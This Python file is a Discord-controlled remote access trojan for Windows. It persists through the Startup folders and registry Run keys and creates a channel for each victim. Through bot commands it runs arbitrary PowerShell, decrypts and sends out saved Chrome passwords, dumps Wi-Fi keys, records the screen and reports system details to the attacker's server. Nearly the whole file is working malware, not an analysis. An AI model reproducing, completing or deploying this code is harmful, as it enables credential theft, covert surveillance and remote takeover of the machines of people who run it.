import os
import cv2
import sys
import uuid
import json
import shutil
import psutil
import socket
import base64
import sqlite3
import imageio
import discord
import asyncio
import platform
import pyautogui
import win32crypt
import subprocess
import numpy as np
import winreg as reg
from datetime import datetime
from Crypto.Cipher import AES
from discord.ext import commands
from win32crypt import CryptUnprotectData

# Constants
TOKEN = "TOKEN" # Discord bot token
USERNAME = os.getenv("USERNAME")  # Windows username
GUILD_ID = 000000000000  # Replace with your actual server ID (Interger)

# Vars for bot
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True # Enables interaction with discord server
intents.message_content = True # Allow bot to read messages from discord channel
bot = commands.Bot(command_prefix='!', intents=intents) # Bot prefix

#start check vars
startup_folder_flag_C = False
startup_folder_flag_A = False
register_flag_C = False
register_flag_A = False

#screen recording vars
recording_task = None

# Functions
def get_ip_address():
    # Function to get the local machine's IP address
    # Note! it gets private ip make it so it will also get public
    try:
        hostname = socket.gethostname() # Get machien hostname
        ip_address = socket.gethostbyname(hostname) # Get the IP address associated with the hostname
        return ip_address
    except Exception as e:
        return f"Error getting IP address: {e}"

def get_mac_address():
    # Gets local machine's mac-address
    try:
        # Getting mac-address using the uuid lib
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])
        return mac
    except Exception as e:
        return f"Error getting MAC address: {e}"

def copy_to_start(program_to_copy):
    global startup_folder_flag_A
    global startup_folder_flag_C
    try:
        a_users = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup") # Startup folder path - all users
        c_user = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup") # Startup path - current users
        os.makedirs(a_users, exist_ok=True) # Create dir if not exist else keep running witout raising a error
        os.makedirs(c_user, exist_ok=True) # Create dir if not exist else keep running witout raising a error
        try: #Copy to all users
            shutil.copy2(program_to_copy, a_users)
            print(f"Successfully copied to: {a_users}")
            startup_folder_flag_A = True
        except Exception as e:
            print("All user error:", e)
        try: # Copy only for current user
            shutil.copy2(program_to_copy, c_user)
            print(f"Successfully copied to: {c_user}")
            startup_folder_flag_C = True
        except Exception as e:
            print("Current user error:", e)

    except Exception as e:
        print(f"There has been an error:\n{e}")

def add_to_register(program_path):
    a_users = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    c_user = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    program_name = os.path.basename(program_path)
    global register_flag_A
    global register_flag_C
    try:
        key = r"SOFTWARE\Microsoft\WIndows\CurrentVersion\Run"
        try: # Current user
            register_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(register_key, program_name, 0, reg.REG_SZ, c_user)
            print(f"Program is added to register: {program_name}")
            reg.CloseKey(register_key)
            register_flag_C = True
        except Exception as e:
            print(e)
        try: # all users
            register_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(register_key, program_name, 0, reg.REG_SZ, a_users)
            print(f"Program is added to register: {program_name}")
            reg.CloseKey(register_key)
            register_flag_A = True
        except Exception as e:
            print(e)
            
    except Exception as e:
        print("Register error {e}")

async def main_loop():
    while True:
        print("loop")
        await asyncio.sleep(5)

async def record_screen(ctx, rec: bool):
    try:
        # Define output name by timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"screen_recording_{timestamp}.mp4"

        # Record the screen in a loop until rec is False
        fps = 12  # Frames per second
        duration = 5  # Duration in seconds
        frames = []

        while rec:  # Loop to keep recording as long as rec is True
            frames.clear()  # Clear the frames from last recording
            for _ in range(fps * duration):
                if not rec:
                    break
                screenshot = pyautogui.screenshot()
                # Convert the screenshot to a numpy array
                frame = np.array(screenshot)
                frames.append(frame)
                await asyncio.sleep(1 / fps)
            if frames:
                # Save frames as a video using imageio
                with imageio.get_writer(output_file, fps=fps) as writer:
                    for frame in frames:
                        writer.append_data(frame)
                # Send the recorded video to Discord
                with open(output_file, "rb") as video_file:
                    await ctx.send(file=discord.File(video_file, output_file))
                # Optional: you can clean up the recorded file after sending it
                os.remove(output_file)

    except asyncio.CancelledError:
        # Handle the task cancellation gracefully
        await ctx.send("Recording was cancelled.")
    except Exception as e:
        await ctx.send(f"❌ Error recording screen: {str(e)}")

@bot.command()
async def what(ctx):
    commands = "**whoami**-(get current user who is running at this moment)\n**ps**-(execute powershell commands)\n**getwifipass**-(get wifi passwords)\n**steal**-(Steals saved chrome email and passwords)\n**screen** -(start|stop)\n**webcam_selfie**-(make a photo of any found webcams)\n**getsysinfo**-(get important system info)\n**echo**-(make the bot echo you)\n**stopbot**-(You know what this does)"
    await ctx.send(commands)

@bot.command()
async def whoami(ctx):
    await ctx.send(f"👻I am: {USERNAME}")

@bot.command()
async def echo(ctx, *, message: str):
    await ctx.send(f" {message}")

@bot.command()
async def webcam_selfie(ctx):
    for i in range(0,10):
        print(i)
        

@bot.command()
async def ps(ctx, *, code: str):
    try:
        process = await asyncio.create_subprocess_exec(
            'powershell', '-NoProfile', '-Command', code,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        # get output and/or error
        stdout, stderr = await process.communicate()

        # Decode output to string
        output = stdout.decode('utf-8').strip()
        error = stderr.decode('utf-8').strip()
        if output:
            result_message = f"**👻Output:**\n{output}"
        elif error:
            result_message = f"**❌Error:**\n{error}"
        else:
            result_message = "❌No output or error from the PowerShell command."

        # Send to bot
        await ctx.send(result_message)
    
    except Exception as e:
        await ctx.send(f"❌ Error executing PowerShell command: {str(e)}")

@bot.command()
async def stopbot(ctx):
    await ctx.send("❌Shutting down the bot...")
    await bot.close()

@bot.command()
async def steal(ctx):
    username = os.environ.get('USERNAME')
    login_data = fr"C:\Users\{username}\AppData\Local\Google\Chrome\User Data\Default\Login Data"

    temp_db_path = 'temp_login_data.db'
    shutil.copy2(login_data, temp_db_path)
    conn = sqlite3.connect(temp_db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    def decrypt_password(encrypted_password, browser='chrome'):
        local_state_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                encrypted_key = encrypted_key[5:]
                key = win32crypt.CryptUnprotectData(encrypted_key)[1]
                nonce = encrypted_password[3:15]
                ciphertext = encrypted_password[15:-16]
                tag = encrypted_password[-16:]
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted_password.decode("utf-8")
        except Exception as e:
            print(f"Error decrypting password: {e}")
            return None

    for row in cursor.fetchall():
        origin_url, username_value, password_value = row
        if password_value:
            decrypted_password = decrypt_password(password_value)
            if decrypted_password:
                await ctx.send(f"✅URL: {origin_url}")
                await ctx.send(f"✅Username: {username_value}")
                await ctx.send(f"✅Password: {decrypted_password}")
            else:
                await ctx.send(f"❌URL: {origin_url}")
                await ctx.send(f"❌Username: {username_value}")
                await ctx.send(f"❌Password: Unable to decrypt: {password_value}")
        else:
            await ctx.send(f"❌URL: {origin_url}")
            await ctx.send(f"❌Username: {username_value}")
            await ctx.send(f"❌Password: [Encrypted]: {password_value}")

    conn.close()
    os.remove(temp_db_path)

@bot.command()
async def getwifipass(ctx):
    try:
        wifi_profiles = {}
        if platform.system() == "Windows":
            result = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True)
            profiles = [line.split(":")[-1].strip() for line in result.splitlines() if "All User Profile" in line]
            for profile in profiles:
                try:
                    profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], text=True)
                    for line in profile_info.splitlines():
                        if "Key Content" in line:
                            wifi_profiles[profile] = line.split(":")[-1].strip()
                            break
                    else:
                        wifi_profiles[profile] = None
                except subprocess.CalledProcessError:
                    wifi_profiles[profile] = None
        await ctx.send(wifi_profiles)
    except Exception as e:
        return {"Error": f"Error getting all Wi-Fi profiles: {e}"}

@bot.command()
async def getsysinfo(ctx):
    try:
        system_info = {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "OS Release": platform.release(),
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "CPU Cores": psutil.cpu_count(logical=False),
            "Logical CPUs": psutil.cpu_count(logical=True),
            "Memory": f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB",
            "GPU": None,
            "IP_address": get_ip_address(),
            "mac-address": get_mac_address()
        }
        try:
            result = subprocess.check_output("wmic path win32_videocontroller get caption", shell=True, text=True)
            system_info["GPU"] = result.split("\n")[1].strip()
        except Exception:
            system_info["GPU"] = "Could not retrieve GPU information"
        await ctx.send(system_info)
    except Exception as e:
        return {"Error": f"Error getting system info: {e}"}
    
@bot.command()
async def screen(ctx, action: str):
    global recording_task  # To access the global task variable
    rec = False

    try:
        if action.lower() == "start":
            if recording_task is not None and not recording_task.done():
                await ctx.send("❌ A recording is already in progress!")
                return

            # Start the recording task
            rec = True
            recording_task = asyncio.create_task(record_screen(ctx, rec))
            await ctx.send("✅ Started the recording")

        elif action.lower() == "stop":
            if recording_task is None or recording_task.done():
                await ctx.send("❌ No recording is currently in progress!")
                return
            # Stop the recording task by setting rec to False
            rec = False
            await ctx.send("✅ Stopping the recording")
            recording_task.cancel()  # This will stop the recording task
            await recording_task  # Wait for the task to finish properly
        elif action != "start" or "stop":
            await ctx.send("❌ Use 'start' or 'stop'!")
        else:
            await ctx.send("❌ Only use 'start' or 'stop'!")

    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.event
async def on_ready():
    print(f'✅ Bot connected as {bot.user}')
    
    guild = bot.get_guild(GUILD_ID)
    if guild is None:
        print("❌ Error: Bot is not in the specified guild or missing permissions.")
        return
    
    print(f'✅ Bot found guild: {guild.name} ({guild.id})')

    # Find or create a text channel based on the username
    channel = discord.utils.get(guild.channels, name=f"{USERNAME}")

    if not channel:
        channel = await guild.create_text_channel(f"{USERNAME}")
        print(f"✅ Created channel: {channel.name}")

    await channel.send(f"👻{USERNAME} is online 🖥️")

    #Start up flag debug
    if startup_folder_flag_A or startup_folder_flag_C or register_flag_A or register_flag_C:
        # Start up
        if startup_folder_flag_C:
            await channel.send("✅ - Startup folder current user")
        elif startup_folder_flag_C == False:
            await channel.send("❌ - Startup folder current user")
        if startup_folder_flag_A:
            await channel.send("✅ - Startup folder All users")
        elif startup_folder_flag_A == False:
            await channel.send("❌ - Startup folder All users")
        
        # Register
        if register_flag_C:
            await channel.send("✅ - Reg startup current users")
        elif register_flag_C == False:
            await channel.send("❌ - Reg startup current users")
        if register_flag_A:
            await channel.send("✅ - Reg startup all users")
        elif register_flag_A == False:
            await channel.send("❌ - Reg startup all users")
    else:
        await channel.send("❌ Both startup en register failed for all users!")


    await channel.send("""``` _____                                                               _____ 
( ___ )                                                             ( ___ )
 |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | 
 |   | _________    _____    _________ ____________________________  |   | 
 |   | \_   ___ \  /  _  \  /   _____//   _____\______   \______   \ |   | 
 |   | /    \  \/ /  /_\  \ \_____  \ \_____  \ |     ___/|       _/ |   | 
 |   | \     \___/    |    \/        \/        \|    |    |    |   \ |   | 
 |   |  \______  \____|__  /_______  /_______  /|____|    |____|_  / |   | 
 |   |         \/        \/        \/        \/                  \/  |   | 
 |   | ______________ ______________                                 |   | 
 |   | \__    ___/   |   \_   _____/                                 |   | 
 |   |   |    | /    ~    |    __)_                                  |   | 
 |   |   |    | \    Y    |        \                                 |   | 
 |   |   |____|  \___|_  /_______  /                                 |   | 
 |   |                 \/        \/              👻                 |   | 
 |   |   ________  ___ ___ ________    ___________________           |   | 
 |   |  /  _____/ /   |   \\_____  \  /   _____\__    ___/           |   | 
 |   | /   \  ___/    ~    \/   |   \ \_____  \  |    |              |   | 
 |   | \    \_\  \    Y    /    |    \/        \ |    |              |   | 
 |   |  \______  /\___|_  /\_______  /_______  / |____|              |   | 
 |   |         \/       \/         \/        \/                      |   | 
 |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| 
(_____)                                                             (_____)```""")
    
       
    await channel.send("```Use !what for info ✅```")
    print(f"✅ {USERNAME} sent a message.")

    # Start the main loop
    bot.loop.create_task(main_loop())

@bot.event
async def on_disconnect():
    guild = bot.get_guild(GUILD_ID)
    if guild is None:
        print("❌ Error: Bot is not in the specified guild or missing permissions.")
        return
    
    print(f'✅ Bot found guild: {guild.name} ({guild.id})')
    channel = discord.utils.get(guild.channels, name=f"{USERNAME}")
    if channel:
        await channel.send("The bot has gone offline! ❌")
    else:
        print("Unable to find the specified channel.")

# Run the bot securely
if TOKEN:
    program_path = os.path.abspath(sys.argv[0])
    copy_to_start(program_path)
    add_to_register(program_path)
    bot.run(TOKEN)
else:
    print("❌ Bot token is missing! Set the DISCORD_BOT_TOKEN environment variable.")


